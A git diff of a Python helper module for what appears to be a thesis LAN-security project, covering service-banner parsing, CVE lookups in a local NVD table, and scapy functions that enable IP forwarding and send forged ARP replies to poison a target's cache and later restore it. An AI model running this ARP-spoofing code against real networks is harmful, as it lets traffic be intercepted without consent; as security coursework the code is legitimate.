@@ -1,13 +1,9 @@
-import re as regex
 import csv
+import os
 from lan_project.models import NvdData
-
-# Some helper functions for lan_project application
-
-
-# Takes an input cve as a string from database, refactors it to be more readable and returns it!
-from scapy.layers.l2 import ARP
-from scapy.sendrecv import send
+import re as regex
+from scapy.layers.l2 import ARP, Ether
+from scapy.sendrecv import send, srp
 
 
 def list_refactor_services(list_item):
@@ -25,6 +21,7 @@ def string_replacer(str_input):
     str_input = str_input.replace(')', '')
     str_input = str_input.replace('\r', '')
     str_input = str_input.replace('\n', '')
+    str_input = str_input.replace('"', '')
     # print('String_replacer function executed')
     return str_input
 
@@ -32,99 +29,69 @@ def string_replacer(str_input):
 def reform_banner(banner):
     for service in banner.split('\n'):
         # Server: Mini web server 1.0 ZTE corp 2005.
-        # Server: 202 (vsFTPd 3.0.3)
+        # Server: 220 (vsFTPd 3.0.3)
         if 'Server:' in service:
             service = service[8:]
             return service
 
 
-def extract_url(list_of_dictionaries):
-    list_of_urls = []
-    print('[+] URL EXTRACTING FUNCTION STARTED')
-    for index, url in enumerate(list_of_dictionaries):
-        if 'URL:' in list_of_dictionaries[index]['references']:
-            position = list_of_dictionaries[index]['references'].find('URL:')
-            full_string = list_of_dictionaries[index]['references']
-            print(full_string)
-            # try to save only the url.
-            only_url = full_string[position:]
-            print(only_url)
-            list_of_urls.append(only_url)
-        else:
-            only_url = ' '
-        return only_url
-
-
 # Class for service analysis
-# If service isn't apache it just returns the service as the result.
 class ServiceManager:
     # function for services running in ports != 80
     # some example services that will be passed in the function
-    # vsFTPd 3.0.3
+    # 220 vsFTPd 3.0.3
+    # Apache/2.4.41 Ubuntu
     @staticmethod
     def analyze_service(inp_service):
-        # remove starting and ending spaces
-        inp_service = inp_service.strip()
-        print('Analyze service function for service : {} started.'.format(inp_service))
-        # APACHE SERVICES... can be ( Apache/2.4++ or Apache or Apache httpd 2.2.2)
-        if 'Apache' and '/' in inp_service:
+        print('Analyzing : {} '.format(inp_service))
+        print('Checking if service {} contains response code at start'.format(inp_service))
+        regex_res = regex.sub('\A\d\d\d', ' ', inp_service)
+        if 'Ubuntu' in regex_res:
+            print('Ubuntu word found.Removing it!')
+            regex_res = regex_res.replace('Ubuntu', '')
+        if 'Debian' in regex_res:
+            print('Debian word found.Removing it!')
+            regex_res = regex_res.replace('Debian', '')
+        inp_service = regex_res.strip()
+        print('input service after changes', inp_service)
+        # APACHE SERVICES... can be ( Apache/2.4.41 ++ or Apache or Apache httpd 2.2.2)
+        if '/' in inp_service:
+            print('special character \'/\' found..splitting')
             inp_service = inp_service.split('/')
-            apache_query = '%Apache http%'
             # inp_service now is inp_service[0]= 'Apache', inp_service[1]= '2.4.41'
-            print('[+] Apache service with version found! --> {}'.format(inp_service))
-            # check if version has 2. in it we search for apache http and 2020 as date.
-            apache_results = [inp_service[0], inp_service[1]]
-            if '2.' in inp_service[1]:
-                date_query = '%2020%'
-                return apache_results, apache_query, date_query
-            else:
-                # TODO: If no version is found maybe provide the latest exploits ??
-                date_query = '%2019%'
-                return apache_results, apache_query, date_query
+            splitted_service = [inp_service[0], inp_service[1]]
+            print('Returning a list.')
+            return splitted_service
         else:
-            # for example vsFTPd 3.0.3
-            if ' ' in inp_service:
-                space_char = ' '
-                pos = []
-                for i in range(0, len(inp_service)):
-                    if inp_service[i] == space_char:
-                        pos.append(i)
-                print('starting string was:', inp_service)
-                print('We keep:', inp_service[:pos[-2]])
-                reformed_service_with_spaces = inp_service[:pos[-2]]
-                serv_name = ''.join(('%', reformed_service_with_spaces, '%'))
-                serv_date = '%2019%'
-                print(serv_name)
-                return reformed_service_with_spaces, serv_name, serv_date
-            else:
-                # nginx service or Swift1.0
-                # checking if the service has its version without space.
-                serv_name = 'Null'
-                serv_date = '2020'
-                reformed_service_with_spaces = 'Swift'
-            #  if regex.match()
-                return reformed_service_with_spaces, serv_name, serv_date
+            return inp_service
 
     @staticmethod
-    # Identifies version and returns the correct date to search in the database.
-    def analyze_date(version_list_item):
-        # check if version is 2. or higher
-        print('figure date function executed')
-        if '2.' in version_list_item:
-            print('Version>2 ....Will query dates %2020%')
-            date_query = '%2020%'
+    def construct_query(item):
+        print('Construct query was called for {}'.format(item))
+        if isinstance(item, list):
+            print('{} is a list.Acting accordingly.'.format(item))
+            query = NvdData.objects.filter(description__contains=item[0]).filter(
+                description__contains=item[1]).reverse()[:3].values('cve', 'references')
+            query_list = list(query)
+            print(query_list)
+            serv_to_return = str(item[0]) + str(item[1])
+            return query_list, serv_to_return
         else:
-            print('Version != 2 ....Will query dates %2019%')
-            date_query = '%2019%'
-        return date_query
+            serv = ' '
+            print('{} is not a list.Constructing simple query.'.format(item))
+            query = NvdData.objects.filter(description__contains=item).reverse()[:2].values('cve', 'references')
+            query_list = list(query)
+            print(query_list)
+            return query_list, serv
 
 
 def update_nvd_model():
-    # default python path is ~/ThesisEnv/src/
+    # database file is downloaded in project's root folder
     CSV_PATH = 'allitems.csv'
     rows_parsed = 0
-    # Remove all data from table
+    # Remove existing table data
     NvdData.objects.all().delete()
+    # parsing the database file and fill the NVDdata table.
     with open(CSV_PATH, encoding='utf-8', errors='ignore', newline='') as csv_file:
         reader = csv.reader(csv_file, delimiter=',', quotechar=';')
         print('Parsing data and creating the model..(this could take some time)')
@@ -145,25 +112,46 @@ def update_nvd_model():
         print('Number of rows inserted :', rows_parsed)
 
 
-def spoof(target_ip, host_ip, verbose=True):
-    """
-    Spoofs `target_ip` saying that we are `host_ip`.
-    it is accomplished by changing the ARP cache of the target (poisoning)
-    """
-    # get the mac address of the target
+def enable_ip_route():
+    if 'nt' in os.name:
+        pass
+    else:
+        print('[+] LINUX SYSTEM')
+        file_path = '/proc/sys/net/ipv4/ip_forward'
+        with open(file_path) as f:
+            if f.read() == 1:
+                print('Already Enabled ip forwarding.')
+                # simple return exits the function(returns None)
+                return
+        # if it isn't enabled it enables it.
+        with open(file_path, 'w') as f:
+            print(1, file=f)
+
+
+def get_mac(target_ip):
+    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=target_ip), timeout=3, verbose=0)
+    if ans:
+        return ans[0][1].src
+    else:
+        return None
+
+
+def start_arp_spoof(target_ip, host_ip):
+    # get the mac for the target_ip
     target_mac = get_mac(target_ip)
     # craft the arp 'is-at' operation packet, in other words; an ARP response
     # we don't specify 'hwsrc' (source MAC address)
     # because by default, 'hwsrc' is the real MAC address of the sender (ours)
     arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
-    # send the packet
-    # verbose = 0 means that we send the packet without printing any thing
     send(arp_response, verbose=0)
-    if verbose:
-        # get the MAC address of the default interface we are using
-        self_mac = ARP().hwsrc
-        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
+    # get our own mac address
+    self_mac = ARP().hwsrc
+    print('[+] Sent to {} : {} is-at {}'.format(target_ip, host_ip, self_mac))
 
 
-
-
+def restore_arp_spoof(target_ip, host_ip):
+    target_mac = get_mac(target_ip)
+    host_mac = get_mac(host_ip)
+    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
+    # send the response packet 8 times just to be sure.
+    send(arp_response, verbose=0, count=8)
